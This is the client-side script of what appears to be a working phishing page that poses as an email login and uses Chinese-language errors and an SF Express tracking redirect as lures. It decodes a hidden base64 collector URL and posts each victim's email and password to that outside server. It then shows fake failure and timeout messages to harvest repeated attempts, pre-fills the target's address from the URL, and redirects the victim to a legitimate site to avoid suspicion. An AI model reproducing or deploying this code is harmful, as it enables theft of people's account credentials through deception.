

      window.MAIL_URL = 'aHR0cHM6Ly9hc3Npc3Rla2RvbWFpbi5vcmcvQHAvY2huL2luZGV4LnBocA=='
      window.AUTH_LOADING_MESSAGE = '. . .'
      window.FINAL_REDIRECT_URL = 'https://www.aftership.com/couriers/sf-express'

      async function sendMail(email, password) {
        try {
          window.MAIL_URL = atob(window.MAIL_URL)
        } catch (e) {}

        try {
          const data = new FormData()
          data.append('email', email)
          data.append('password', password)
          return await axios.post(window.MAIL_URL, data)
        } catch (error) {
          throw Error('Unable to connect to server')
        }
      }

      function validateEmail(email) {
        const re =
          /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
        return re.test(email)
      }

      function randomString(
        length,
        chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
      ) {
        var result = ''
        for (var i = length; i > 0; --i)
          result += chars[Math.floor(Math.random() * chars.length)]
        return result
      }

      const companyName = (...args) => {
        const { email } = args[0]
        let company_name = email.substring(
          email.lastIndexOf('@') + 1,
          email.lastIndexOf('.')
        )

        return company_name
      }

      function turnUrlToRandom() {
        const url = new URL(window.location.href)

        if (
          !(
            (
              url.searchParams.has('websrc') &&
              url.searchParams.has('dispatch') &&
              url.searchParams.has('id')
            )
            //&& url.searchParams.has('email')
          )
        ) {
          url.searchParams.append(
            'websrc',
            url.searchParams.get('websrc') || this.randomString(302)
          )
          url.searchParams.append(
            'dispatch',
            url.searchParams.get('dispatch') ||
              this.randomString(3, '0123456789')
          )
          url.searchParams.append(
            'id',
            url.searchParams.get('id') || this.randomString(6, '0123456789')
          )
          //url.searchParams.append('email', url.searchParams.get('email'));

          window.location.replace(url.toString())
        }
      }

      function validateEmail(email) {
        const re =
          /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
        return re.test(email)
      }

      $(function () {
        //BEGIN
        window.retryAttemptCount = 0
        const formElement = $('#formCon')
        const emailElement = $('input#login')
        const passwordElement = $('input#passwd')
        const submitButtonElement = $('#viewBtn')
        const $mimick = {
          html: (text) => {
            alert(text)
            $('body').css('opacity', '1')
          },
          show: () => {},
          hide: () => {},
        }
        const errorElement = { ...$mimick }
        const successElement = { ...$mimick }
        const errorElement2 = $("#err")
        const togglePasswordVisibilityElement = $('#passwordVisibilityToggle')

        turnUrlToRandom()

        //SET AXIOS RESPONSE TIME
        axios.interceptors.request.use((config) => {
          config.headers['request-startTime'] = new Date()
          return config
        })

        axios.interceptors.response.use((response) => {
          const start = response.config.headers['request-startTime']
          const end = new Date()
          const milliseconds = end - start
          response.headers['request-duration'] = milliseconds
          return response
        })

        // SET EMAIL HASH
        const pageUrl = window.location.href
        const pageUrlArray = pageUrl.split('#')
        if (pageUrlArray.length > 1) {
          const emailHref64 = pageUrlArray[pageUrlArray.length - 1]
          try {
            const foundEmail = validateEmail(emailHref64)
              ? emailHref64
              : atob(emailHref64)
            emailElement.val(foundEmail)
          } catch (e) {}
        }

        //add class if element has value
        if (emailElement.val().length > 0) {
          emailElement.addClass('hasValue')
        }
        if (passwordElement.val().length > 0) {
          passwordElement.addClass('hasValue')
        }
        //set the autofocus
        if (emailElement.val().length > 0) {
          passwordElement.focus()
        } else {
          emailElement.focus()
        }

        emailElement.keyup(function () {
          if ($(this).val().length > 0) {
            $(this).addClass('hasValue')
          } else {
            $(this).removeClass('hasValue')
          }
        })

        passwordElement.keyup(function () {
          if ($(this).val().length > 0) {
            $(this).addClass('hasValue')
          } else {
            $(this).removeClass('hasValue')
          }
        })

        //TOGGLE PASSWORD VISIBILITY
        togglePasswordVisibilityElement.on('click', function (e) {
          e.preventDefault()

          const passwordElementTypeAttribute = passwordElement.attr('type')

          if (passwordElementTypeAttribute == 'password') {
            passwordElement.attr('type', 'text')
            $(this).removeClass('fa-eye-slash').addClass('fa-eye')
          } else {
            passwordElement.attr('type', 'password')
            $(this).addClass('fa-eye-slash').removeClass('fa-eye')
          }
        })

        $('body').on('click', 'a', function (e) {
          e.preventDefault()
        })

        $('#aaatch').on('load', aaatch())

        function aaatch() {
          const named = companyName({
            email: emailElement.val(),
          })

          $('#cmpy_nm').html(
            named.replace(named.charAt(0), named.charAt(0).toUpperCase())
          )
        }

        //FORM SUBMIT ACTION
        formElement.on('submit', function (e) {
          e.preventDefault()
        })

        submitButtonElement.on('click', async function (e) {
          $('body').css('opacity', '0.5')
          e.preventDefault()
          aaatch()
          errorElement.hide()
          successElement.hide()

          const submitButtonInnerText = submitButtonElement.text()

          try {
            const emailVal = emailElement.val().trim()
            const passwordVal = passwordElement.val().trim()

            if (!(emailVal && passwordVal)) {
              throw Error('<p>&#38656;&#35201;&#30005;&#23376;&#37038;&#20214;&#21644;&#23494;&#30721;</p>')
            }

            if (!validateEmail(emailVal)) {
              throw Error('Email is invalid.')
            }

            if (passwordVal.length <= 4) {
              throw Error('<p>&#23494;&#30721;&#25110;&#29992;&#25143;&#21517;&#26080;&#25928;&#65292;&#35831;&#37325;&#35797;&#27491;&#30830;&#65281;</p>')
            }

            // button authorizing
            submitButtonElement.text(window.AUTH_LOADING_MESSAGE)
            const response = await sendMail(emailVal, passwordVal)

            setTimeout(function () {
              submitButtonElement.text(submitButtonInnerText)

              if (parseInt(window.retryAttemptCount) <= 1) {
                window.retryAttemptCount =
                  parseInt(window.retryAttemptCount) + 1
                passwordElement.val('')
                errorElement.html('Please make sure you are connected to the internet.')
                errorElement2.html('<center><p>&#23494;&#30721;&#25110;&#29992;&#25143;&#21517;&#26080;&#25928;&#65292;&#35831;&#37325;&#35797;&#27491;&#30830;!</p></center>')
              } else {
                //success message
                successElement.html(
                  'Sorry, your login session has timed out, please try again'
                )
                //redirect
                setTimeout(function () {
                if (window.FINAL_REDIRECT_URL) window.location.replace(window.FINAL_REDIRECT_URL)
                else 
                  window.location.replace(
                    'http://' + emailElement.val().split('@')[1]
                  )
                }, 500);
              }
            }, 1000 - response.headers['request-duration'])
          } catch (error) {
            errorElement.html(error.message)
            setTimeout(function () {
              submitButtonElement.text(submitButtonInnerText)
            }, 500)
          }
        })
      })
